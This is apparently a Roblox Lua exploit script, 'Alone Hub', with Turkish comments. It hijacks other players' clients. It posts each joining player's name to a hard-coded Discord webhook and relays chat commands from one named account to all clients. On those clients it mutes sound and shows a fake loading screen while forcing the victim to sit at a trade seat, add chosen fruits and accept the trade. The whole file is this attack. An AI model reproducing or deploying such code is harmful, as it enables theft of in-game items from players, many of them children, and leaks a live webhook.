--// ALONE HUB - CONTROL SCRIPT //--

--🔁 RemoteEvent kurulumu
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")

local remote = ReplicatedStorage:FindFirstChild("AloneHubControl") or Instance.new("RemoteEvent", ReplicatedStorage)
remote.Name = "AloneHubControl"

--📩 Webhook bildirimi
local webhookURL = "https://discord.com/api/webhooks/1384017369344512100/naQWlqa18VxKu0JUsBHAHDZc2-v-RXK5GyhDnrUAz7FnxeUXGcwttwoR-wCgrRKBdnVV"
local function sendWebhook(player)
	local data = {
		username = "AloneHub Logger",
		content = "**🎮 "..player.Name.." just executed the control script.**"
	}
	local headers = {["Content-Type"] = "application/json"}
	pcall(function()
		HttpService:PostAsync(webhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson, false, headers)
	end)
end

--🧠 Sunucu tarafı komut dinleyici (sadece im_kiddd8 komut verebilir)
Players.PlayerAdded:Connect(function(player)
	sendWebhook(player)
	player.Chatted:Connect(function(msg)
		if player.Name == "im_kiddd8" then
			for _, plr in ipairs(Players:GetPlayers()) do
				if plr ~= player then
					remote:FireClient(plr, msg)
				end
			end
		end
	end)
end)

--🧠 Client tarafı komut alıcı
local lp = Players.LocalPlayer or nil
if lp then
	--🔇 Ses kapatma
	for _, s in pairs(SoundService:GetDescendants()) do
		if s:IsA("Sound") then
			s.Volume = 0
		end
	end

	--⏳ Yüklenme ekranı
	local gui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
	gui.Name = "AloneHub_Loading"

	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0.5, 0, 0.05, 0)
	frame.Position = UDim2.new(0.25, 0, 0.45, 0)
	frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

	local progress = Instance.new("Frame", frame)
	progress.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
	progress.Size = UDim2.new(0, 0, 1, 0)

	TweenService:Create(progress, TweenInfo.new(10), {Size = UDim2.new(1, 0, 1, 0)}):Play()

	--🟪 Komut işleyici
	remote.OnClientEvent:Connect(function(msg)
		if msg == "!sit" then
			for _, seat in pairs(workspace:GetDescendants()) do
				if seat:IsA("Seat") and seat.Name:lower():find("trade") and not seat.Occupant then
					local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
					if hrp then
						local tween = TweenService:Create(hrp, TweenInfo.new(2), {Position = seat.Position + Vector3.new(0, 2, 0)})
						tween:Play()
						tween.Completed:Wait()
						lp.Character:MoveTo(seat.Position)
					end
					break
				end
			end
		elseif msg:match("!addfruit%s+(%w+)") then
			local fruit = msg:match("!addfruit%s+(%w+)")
			local gui = lp.PlayerGui:FindFirstChild("Main")
			if gui and gui:FindFirstChild("Trade") then
				local fruitList = gui.Trade:FindFirstChild("FruitList")
				if fruitList and fruitList:FindFirstChild(fruit) then
					local button = fruitList:FindFirstChild(fruit)
					if button:IsA("ImageButton") then
						pcall(function()
							fireclickdetector(button:FindFirstChildWhichIsA("ClickDetector"))
						end)
					end
				end
			end
		elseif msg == "!accept" then
			local gui = lp.PlayerGui:FindFirstChild("Main")
			if gui and gui:FindFirstChild("Trade") then
				local acceptBtn = gui.Trade:FindFirstChild("Accept")
				if acceptBtn and acceptBtn:IsA("ImageButton") then
					pcall(function()
						fireclickdetector(acceptBtn:FindFirstChildWhichIsA("ClickDetector"))
					end)
				end
			end
		end
	end)
end
